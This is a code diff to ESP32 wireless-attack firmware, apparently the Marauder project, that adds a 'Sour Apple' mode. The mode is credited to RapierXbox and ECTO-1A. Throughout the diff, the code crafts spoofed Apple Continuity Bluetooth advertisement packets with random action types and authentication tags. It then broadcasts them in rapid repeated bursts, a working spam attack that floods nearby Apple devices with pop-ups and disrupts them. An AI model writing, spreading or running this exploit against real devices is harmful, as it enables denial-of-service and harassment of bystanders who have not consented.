@@ -18,6 +18,36 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 }
 
 #ifdef HAS_BT
+  //ESP32 Sour Apple by RapierXbox
+  //Exploit by ECTO-1A
+  NimBLEAdvertising *pAdvertising;
+
+  NimBLEAdvertisementData getOAdvertisementData() {
+    NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
+    uint8_t packet[17];
+    uint8_t size = 17;
+    uint8_t i = 0;
+
+    packet[i++] = size - 1;    // Packet Length
+    packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
+    packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
+    packet[i++] = 0x00;        // ...
+    packet[i++] = 0x0F;  // Type
+    packet[i++] = 0x05;                        // Length
+    packet[i++] = 0xC1;                        // Action Flags
+    const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
+    packet[i++] = types[rand() % sizeof(types)];  // Action Type
+    esp_fill_random(&packet[i], 3); // Authentication Tag
+    i += 3;   
+    packet[i++] = 0x00;  // ???
+    packet[i++] = 0x00;  // ???
+    packet[i++] =  0x10;  // Type ???
+    esp_fill_random(&packet[i], 3);
+
+    randomAdvertisementData.addData(std::string((char *)packet, 17));
+    return randomAdvertisementData;
+  }
+
   class bluetoothScanAllCallback: public BLEAdvertisedDeviceCallbacks {
   
       void onResult(BLEAdvertisedDevice *advertisedDevice) {
@@ -412,6 +442,11 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
       RunBluetoothScan(scan_mode, color);
     #endif
   }
+  else if (scan_mode == BT_ATTACK_SOUR_APPLE) {
+    #ifdef HAS_BT
+      RunSourApple(scan_mode, color);
+    #endif
+  }
   else if ((scan_mode == BT_SCAN_WAR_DRIVE) ||
            (scan_mode == BT_SCAN_WAR_DRIVE_CONT)) {
     #ifdef HAS_BT
@@ -515,10 +550,11 @@ bool WiFiScan::shutdownWiFi() {
 bool WiFiScan::shutdownBLE() {
   #ifdef HAS_BT
     if (this->ble_initialized) {
+      pAdvertising->stop();
       pBLEScan->stop();
       
       pBLEScan->clearResults();
-      BLEDevice::deinit();
+      NimBLEDevice::deinit();
 
       #ifdef MARAUDER_FLIPPER
         flipper_led.offLED();
@@ -574,6 +610,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
 
   
   else if ((currentScanMode == BT_SCAN_ALL) ||
+  (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE_CONT) ||
   (currentScanMode == BT_SCAN_SKIMMERS))
@@ -1359,6 +1396,15 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
   initTime = millis();
 }
 
+void WiFiScan::executeSourApple() {
+  delay(40);
+  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
+  pAdvertising->setAdvertisementData(advertisementData);
+  pAdvertising->start();
+  delay(20);
+  pAdvertising->stop();
+}
+
 void WiFiScan::executeWarDrive() {
   #ifdef HAS_GPS
     if (gps_obj.getGpsModuleStatus()) {
@@ -1706,6 +1752,31 @@ void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
   esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
   initTime = millis();
+}
+
+void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
+  #ifdef HAS_BT
+    NimBLEDevice::init("");
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+
+    pAdvertising = pServer->getAdvertising();
+
+    #ifdef HAS_SCREEN
+      display_obj.TOP_FIXED_AREA_2 = 48;
+      display_obj.tteBar = true;
+      display_obj.print_delay_1 = 15;
+      display_obj.print_delay_2 = 10;
+      display_obj.initScrollValues(true);
+      display_obj.tft.setTextWrap(false);
+      display_obj.tft.setTextColor(TFT_BLACK, color);
+      display_obj.tft.fillRect(0,16,240,16, color);
+      display_obj.tft.drawCentreString("Sour Apple",120,16,2);
+      display_obj.touchToExit();
+      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    #endif
+
+    this->ble_initialized;
+  #endif
 }
 
 // Function to start running any BLE scan
@@ -4032,6 +4103,25 @@ void WiFiScan::main(uint32_t currentTime)
       initTime = millis();
       channelHop();
     }
+  }
+  else if (currentScanMode == BT_ATTACK_SOUR_APPLE) {
+    #ifdef HAS_BT
+      if (currentTime - initTime >= 1000) {
+        initTime = millis();
+        String displayString = "";
+        String displayString2 = "";
+        displayString.concat("Advertising Data...");
+        for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
+          displayString2.concat(" ");
+        #ifdef HAS_SCREEN
+          display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+          display_obj.showCenterText(displayString2, 160);
+          display_obj.showCenterText(displayString, 160);
+        #endif
+      }
+
+      this->executeSourApple();
+    #endif
   }
   else if (currentScanMode == WIFI_SCAN_WAR_DRIVE) {
     if (currentTime - initTime >= this->channel_hop_delay * 1000)
